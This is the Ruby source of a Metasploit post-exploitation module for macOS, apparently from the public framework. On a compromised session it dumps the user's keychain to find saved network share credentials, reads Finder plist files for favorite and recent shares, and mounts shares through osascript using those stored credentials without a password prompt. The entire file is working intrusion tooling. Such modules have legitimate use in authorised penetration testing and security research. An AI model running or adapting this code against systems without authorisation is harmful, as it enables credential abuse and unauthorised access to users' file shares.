##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Post

  # list of accepted file share protocols. other "special" URLs (like vnc://) will be ignored.
  FILE_SHARE_PROTOCOLS = %w(smb nfs cifs ftp afp)

  # Used to parse a name property from a plist
  NAME_REGEXES = [/^Name \= \"(.*)\"\;$/, /^Name \= (.*)\;$/]

  # Used to parse a URL property from a plist
  URL_REGEX = /^URL = \"(.*)\"\;$/

  include Msf::Post::File

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'OSX Network Share Mounter',
        'Description'   => %q{
          This module lists saved network shares and tries to connect to them using stored credentials. This does not require root privileges.
        },
        'License'       => MSF_LICENSE,
        'Author'        =>
          [
            'Peter Toth <globetother[at]gmail.com>',
            'joev'
          ],
        'Platform'      => [ 'osx' ],
        'SessionTypes'  => [ 'shell', 'meterpreter' ],
        'Actions'       => [
          [ 'LIST',    { 'Description' => 'Show a list of stored network share credentials' } ],
          [ 'MOUNT',   { 'Description' => 'Mount a network shared volume using stored credentials' } ],
          [ 'UNMOUNT', { 'Description' => 'Unmount a mounted volume' } ]
        ],
        'DefaultAction' => 'LIST'
      ))

    register_options(
      [
        OptString.new('VOLUME', [true, 'Name of network share volume. `set ACTION LIST` to get a list.', 'localhost']),
        OptEnum.new('PROTOCOL', [true, 'Network share protocol.', 'smb', FILE_SHARE_PROTOCOLS])
      ], self.class)

    register_advanced_options(
      [
        OptString.new('SECURITY_PATH', [true, 'Path to the security executable.', '/usr/bin/security']),
        OptString.new('OSASCRIPT_PATH', [true, 'Path to the osascript executable.', '/usr/bin/osascript']),
        OptString.new('SIDEBAR_PLIST_PATH', [true, 'Path to the finder sidebar plist.', '~/Library/Preferences/com.apple.sidebarlists.plist']),
        OptString.new('RECENT_PLIST_PATH', [true, 'Path to the finder recent plist.', '~/Library/Preferences/com.apple.recentitems.plist'])
      ]
    )
  end

  def run
    username = cmd_exec('whoami').strip
    security_path = datastore['SECURITY_PATH'].shellescape
    sidebar_plist_path = datastore['SIDEBAR_PLIST_PATH'].gsub(/^\~/, "/Users/#{username}").shellescape
    recent_plist_path = datastore['RECENT_PLIST_PATH'].gsub(/^\~/, "/Users/#{username}").shellescape

    if action.name == 'LIST'
      if file?(security_path)
        saved_shares = get_keyring_shares(security_path)
        if saved_shares.length == 0
          print_status("No Network Share credentials were found in the keyrings")
        else
          print_status("Network shares saved in keyrings:")
          print_status("  Protocol\tShare Name")
          saved_shares.each do |line|
            print_good("  #{line}")
          end
        end
      else
        print_error("Could not check keyring contents: Security binary not found.")
      end
      if file?(sidebar_plist_path)
        favorite_shares = get_favorite_shares(sidebar_plist_path)
        if favorite_shares.length == 0
          print_status("No favorite shares were found")
        else
          print_status("Favorite shares (without stored credentials):")
          print_status("  Protocol\tShare Name")
          favorite_shares.each do |line|
            print_uri(line)
          end
        end
      else
        print_error("Could not check sidebar favorites contents: Sidebar plist not found")
      end
      if file?(recent_plist_path)
        recent_shares = get_recent_shares(recent_plist_path)
        if recent_shares.length == 0
          print_status("No recent shares were found")
        else
          print_status("Recent shares (without stored credentials):")
          print_status("  Protocol\tShare Name")
          recent_shares.each do |line|
            print_uri(line)
          end
        end
      else
        print_error("Could not check recent favorites contents: Recent plist not found")
      end
      mounted_shares = get_mounted_volumes
      if mounted_shares.length == 0
        print_status("No volumes found in /Volumes")
      else
        print_status("Mounted Volumes:")
        mounted_shares.each do |line|
          print_good("  #{line}")
        end
      end
    elsif action.name == 'MOUNT'
      mount
    elsif action.name == 'UNMOUNT'
      unmount
    end
  end

  # Returns the network shares stored in the user's keychain. These shares will often have
  # creds attached, so mounting occurs without prompting the user for a password.
  # @return [Array<String>] sorted list of volumes stored in the user's keychain
  def get_keyring_shares(security_path)
    # Grep for desc srvr and ptcl
    data = cmd_exec("#{security_path} dump")
    lines = data.lines.select { |line| line =~ /desc|srvr|ptcl/ }.map(&:strip)

    # Go through the list, find the saved Network Password descriptions
    # and their corresponding ptcl and srvr attributes
    list = []
    lines.each_with_index do |line, x|
      if line =~ /"desc"<blob>="Network Password"/ && x < lines.length-2
        # Remove everything up to the double-quote after the equal sign,
        # and also the trailing double-quote
        if lines[x+1].match "^.*\=\"(.*)\w*\"\w*$"
          protocol = $1
          if protocol.start_with?(*FILE_SHARE_PROTOCOLS) && lines[x+2].match("^.*\=\"(.*)\"\w*$")
            server = $1
            list.push(protocol + "\t" + server)
          end
        end
      end
    end
    list.sort
  end

  # Returns the user's "Favorite Shares". To add a Favorite Share on OSX, press cmd-k in Finder, enter
  # an address, then click the [+] button next to the address field.
  # @return [Array<String>] sorted list of volumes saved in the user's "Recent Shares"
  def get_favorite_shares(sidebar_plist_path)
    # Grep for URL
    data = cmd_exec("defaults read #{sidebar_plist_path} favoriteservers")
    list = data.lines.map(&:strip).map { |line| line =~ URL_REGEX && $1 }.compact

    # Grep for EntryType and Name
    data = cmd_exec("defaults read #{sidebar_plist_path} favorites")
    lines = data.lines.map(&:strip).select { |line| line =~ /EntryType|Name/ }

    # Go through the list, find the rows with EntryType 8 and their corresponding name
    lines.each_with_index do |line, x|
      if line =~ /EntryType = 8;/ && x < lines.length-1
        if NAME_REGEXES.any? { |r| lines[x+1].strip =~ r }
          list.push($1)
        end
      end
    end

    list.sort
  end

  # Returns the user's "Recent Shares" list
  # @return [Array<String>] sorted list of volumes saved in the user's "Recent Shares"
  def get_recent_shares(recent_plist_path)
    # Grep for Name
    data = cmd_exec("defaults read #{recent_plist_path} Hosts")
    data.lines.map(&:strip).map { |line| line =~ URL_REGEX && $1 }.compact.uniq.sort
  end

  # @return [Array<String>] sorted list of mounted volume names
  def get_mounted_volumes
    cmd_exec("ls /Volumes").lines.map(&:strip).sort
  end

  def mount
    share_name = datastore['VOLUME']
    protocol = datastore['PROTOCOL']
    print_status("Connecting to #{protocol}://#{share_name}")
    cmd_exec("#{osascript_path} -e 'tell app \"finder\" to mount volume \"#{protocol}://#{share_name}\"'")
  end

  def unmount
    share_name = datastore['VOLUME']
    print_status("Disconnecting from #{share_name}")
    cmd_exec("#{osascript_path} -e 'tell app \"finder\" to eject \"#{share_name}\"'")
  end

  # hook cmd_exec to print a debug message when DEBUG=true
  def cmd_exec(cmd)
    vprint_status(cmd)
    super
  end

  # Prints a file share url (e.g. smb://joe.com) as Protocol + \t + Host
  # @param [String] line the URL to parse and print formatted
  def print_uri(line)
    if line =~ /^(.*?):\/\/(.*)$/
      print_good "  #{$1}\t#{$2}"
    else
      print_good "  #{line}"
    end
  end

  # path to osascript on the remote system
  def osascript_path; datastore['OSASCRIPT_PATH'].shellescape; end
end
